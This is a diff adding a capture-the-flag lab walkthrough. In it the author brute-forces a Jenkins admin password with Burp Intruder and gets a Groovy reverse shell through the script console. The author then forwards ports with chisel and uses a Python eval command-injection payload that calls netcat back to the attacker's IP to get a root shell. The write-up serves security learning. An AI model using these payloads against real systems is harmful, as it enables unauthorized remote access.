@@ -123,15 +123,161 @@ From our scan we have more filtered ports compared to open ports. The open ports
 
 
 
+# Enumeration 
+Going to the webpage, we get this
+
+![image](https://user-images.githubusercontent.com/67879936/230775703-28076519-91bb-4815-b001-866a69097594.png)
+
+This webpage is running Jenkins, to access the page we have to login. Lets go ahead and search for default creds
+
+![image](https://user-images.githubusercontent.com/67879936/230775812-c18bb87f-ea34-4ead-8f63-adfeb90d9195.png)
+
+so we can assume that the username is ```admin```, but getting the password will be a bit of an issue. Lets try to bruteforce the password using burpsuite
+
+![image](https://user-images.githubusercontent.com/67879936/230775958-3db286da-c9eb-42e3-95e0-00877afd42be.png)
+![image](https://user-images.githubusercontent.com/67879936/230775963-f88dee97-d8a4-421d-ace4-fe35087de540.png)
+
+Sending this to burp intruder
+
+![image](https://user-images.githubusercontent.com/67879936/230776066-ca3f7807-4db8-4467-9c98-fd008dbd32df.png)
+![image](https://user-images.githubusercontent.com/67879936/230776283-7d1624ec-f660-49e0-af14-b1adc0a7f389.png)
+
+Uesd that wordlist from Seclists, click on start attack after loading your password wordlist.
+
+![image](https://user-images.githubusercontent.com/67879936/230776378-48950a63-409b-4393-a768-a87b3ab7e046.png)
+
+we found our password hehe. Now, lets try to login
+
+```username:admin```             ```password:matrix```
+
+![image](https://user-images.githubusercontent.com/67879936/230776407-42050e30-dc80-40a4-a52e-b0faf75e50f0.png)
+![image](https://user-images.githubusercontent.com/67879936/230776519-962416c3-b1ef-4c56-8be9-0ff87f41a79d.png)
+
+cool, we are logged in. Looking around the webpage, you should see this
+
+![image](https://user-images.githubusercontent.com/67879936/230776632-d9a919fd-e7eb-449f-8187-03a220a00287.png)
+
+scroll down, you should find this
+
+![image](https://user-images.githubusercontent.com/67879936/230776671-9ba428bf-edba-4795-a837-5cb771256c3f.png)
+![image](https://user-images.githubusercontent.com/67879936/230776696-1ff12aeb-f0e4-4bba-83c0-dae731cf337e.png)
+
+so, we can run a groovy script in that console. Lets try to run a simple groovy program.
+
+script:```println "Hello, world!"```
+
+This should print ```Hello, world!``` to the console.
+
+![image](https://user-images.githubusercontent.com/67879936/230776893-c20d38cf-acce-4fe3-892f-28291ec2dc97.png)
+
+cool, so we can use this to get a reverse shell bacl to our machine by putting our malicious payload into the script.
+
+payload: ```String host="10.66.67.114";int port=1234;String cmd="/bin/sh";Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();```
+
+We'll be using this to get our reverse shell.  Ensure you edit the $host and $port to yours.
+
+Also, before running the script ensure you set up your netcat listener
+
+![image](https://user-images.githubusercontent.com/67879936/230777229-8d45029e-05ba-4a88-a33f-ce8ea37290b1.png)
+
+on the netcat listener,
+
+![image](https://user-images.githubusercontent.com/67879936/230777280-5d553cca-8eb8-46be-a1dd-7cdf986f5271.png)
+
+cool, we got our shell
+
+![image](https://user-images.githubusercontent.com/67879936/230777391-0eb36670-d41f-4954-bd9c-e100cbeffa7f.png)
+
+Checking the user's home directory
+
+![image](https://user-images.githubusercontent.com/67879936/230777459-7eb15c5d-e67e-44fe-af9c-d7cf335be823.png)
+
+oops, we don't have access to view any file here because they belong to user ```juniordev```.
+
+Lets try to display all open tcp connections on this box
+
+command:```netstat -antup```
+
+![image](https://user-images.githubusercontent.com/67879936/230777758-806e176b-a8c8-4bcc-80e9-11ba52572a74.png)
+
+cool, we found something. A port ```8080``` running on localhost. We'll be portforwarding here and we'll be using a tool called ```chisel``` to do this.
+
+![image](https://user-images.githubusercontent.com/67879936/230777988-a0435308-38f0-4719-8f39-7f78b160703e.png)
+![image](https://user-images.githubusercontent.com/67879936/230778143-eee590cc-9176-4461-bca6-9dcd48fd9a82.png)
+
+Now, lets run this tool
+
+on attacker's machine:```chisel server -p 9001 --reverse```
+on target's machine:```chisel client <ur ip>:9001 R:8080:127.0.0.1:8080```
+
+![image](https://user-images.githubusercontent.com/67879936/230778358-9d9324de-3d22-469e-94f9-c0106d57b0b8.png)
+![image](https://user-images.githubusercontent.com/67879936/230778370-27ea0126-e58f-4acc-ac95-21d9d7ae11bc.png)
+
+cool, now lets visit this webpage ```http://127.0.0.1:8080/```. You should get this
+
+![image](https://user-images.githubusercontent.com/67879936/230778434-59e5ea45-eaa3-45fb-a7ce-4bc787c7649a.png)
+
+Checking the source page
+
+![image](https://user-images.githubusercontent.com/67879936/230778531-a5f29e7b-2761-44ee-b7a4-13ea3048e680.png)
+
+Lets check that path out
+
+![image](https://user-images.githubusercontent.com/67879936/230778581-76649bb2-4dcd-437c-a481-9f709ea15f52.png)
+
+nice, we got ```FLAG 71``` already. 
+
+Moving on, playing around the webpage I noticed it helps us with adding numbers, but how does this help us in getting a reverse shell lool. Checking the page source again
+
+![image](https://user-images.githubusercontent.com/67879936/230779004-a7f401ab-1113-482f-a2be-99a13d43841d.png)
+
+I actually found out this is a python web app. Lets try to capture the request on burpsuite
+
+![image](https://user-images.githubusercontent.com/67879936/230779184-d113b284-a1ad-42b5-8dc7-3dde9d9e9511.png)
+![image](https://user-images.githubusercontent.com/67879936/230779233-5e8d1c23-0974-48d3-afb6-4d5278450f6c.png)
+
+cool, send it over to burp repeater
+
+I read this [article](https://sethsec.blogspot.com/2016/11/exploiting-python-code-injection-in-web.html) on exploiting command injection on python web apps.
+
+I found a payload that got me a reverse shell back to my machine
+
+payload:```eval('__import__(\'os\').popen(\'nc+10.66.67.114+1337+-e+/bin/sh\').read()')```
+
+![image](https://user-images.githubusercontent.com/67879936/230779765-2426d9f8-367b-4974-bf86-592fa24e8a17.png)
+
+on your netcat listener
+
+![image](https://user-images.githubusercontent.com/67879936/230779798-cb59958e-1f08-4361-8bfa-d7969e18f198.png)
+
+cool hehe, we got a shell as the ```root``` user. 
+
+Out of 4 flags, we've gotten only one so far. Lets look for the other three
+
+![image](https://user-images.githubusercontent.com/67879936/230779965-8d1f6010-002b-409a-95f1-4fbb551a07a3.png)
+
+Found a flag in the ```/root``` directory
+
+We'll be using the ```find``` command to look for the remaining 2
+
+command:```find / 2>/dev/null | grep -i FLAG70```
+
+![image](https://user-images.githubusercontent.com/67879936/230780175-84706abf-11ae-4fcc-a037-54d344d4dae2.png)
+
+Found another one in the ```/var/lib/jenkins``` directory
+
+Using the  ```find``` command again
+
+command:```find / 2>/dev/null | grep -i FLAG69```
+
+![image](https://user-images.githubusercontent.com/67879936/230780562-ebd5a965-862c-47f6-a7a5-951a096ab2f4.png)
+
+Found the last flag in the ```/var/lib/jenkins/users/FLAG69_7705914462374786576``` directory.
 
 
-
-
-
-
-
-
-
+That will be all for today
+<br> <br>
+[Back To Home](../../index.md)
 
 
 
